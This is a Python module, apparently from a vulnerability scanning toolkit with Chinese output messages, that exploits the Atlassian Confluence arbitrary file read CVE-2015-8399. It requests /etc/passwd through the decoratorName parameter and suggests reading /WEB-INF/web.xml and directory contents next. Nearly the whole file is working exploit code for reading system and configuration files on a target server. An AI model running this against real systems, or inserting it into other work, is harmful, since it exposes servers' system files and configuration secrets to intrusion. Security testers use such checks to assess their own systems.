# body="./images/lg_05_1.gif"
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Cve_2015_8399:
	def scan(self,baseurl):
		url=baseurl+"/spaces/viewdefaultdecorator.action?decoratorName=file:///etc/passwd"
		try:
			response = requests.get(url=url,headers=self.headers,verify=self.ssl,proxies=self.proxy,timeout=15)
			if "root:x" in response.text:
				OutPrintInfoSuc("Atlassian", f"存在Atlassian Confluence任意文件读取{url}")
				if not self.batch:
					OutPrintInfo("Atlassian","[b bright_red]decoratorName=/WEB-INF/web.xml 读取配置⽂件")
					OutPrintInfo("Atlassian","[b bright_red]decoratorName=/或.，可查看⽬录⽂件")
				else:
					OutPutFile("atlassian_2015_8399.txt",f"存在Atlassian Confluence任意文件读取{url}")
				return True
			else:
				if not self.batch:
					OutPrintInfo("Atlassian","不存在Atlassian Confluence任意文件读取")
		except Exception:
			if not self.batch:
				OutPrintInfo("Atlassian", "目标请求出错")


	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		header = target["header"]
		proxy = target["proxy"]
		self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("Atlassian", '开始执行Atlassian Confluence任意文件读取...')
			self.scan(url)

		if not self.batch:
			OutPrintInfo("Atlassian", 'Atlassian Confluence任意文件读取执行结束')